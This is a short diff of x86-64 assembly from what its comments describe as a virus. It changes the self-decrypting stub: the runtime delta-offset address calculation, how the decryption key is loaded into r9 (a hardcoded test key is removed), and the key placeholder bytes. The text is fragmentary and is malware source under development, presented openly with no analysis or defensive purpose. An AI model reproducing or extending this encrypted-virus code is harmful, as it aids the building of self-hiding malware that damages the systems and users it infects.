@@ -25,7 +25,7 @@ decryptor:
     pop rbp ; We pop this address into rbp
     sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
 
-  ; mov r9, [rbp + key - _start + 1]
+  mov r9, [rbp + key - v_stop + _start + 4]
   ; mov r9, [rel key]
   ; address
   ; size
@@ -258,7 +258,6 @@ _start:
 
     .load_key:
       mov r9, [r15 + KEY]
-      mov r9, 0x4242424242424242
 
     ; copy decryptor on the stack
     mov r12, _start - decryptor ; size to copy
@@ -422,7 +421,7 @@ cleanup:
 v_stop:
   jmp exit
 key:
-  db 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
+  db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
 
 exit:
   xor rdi, rdi ; exit code 0
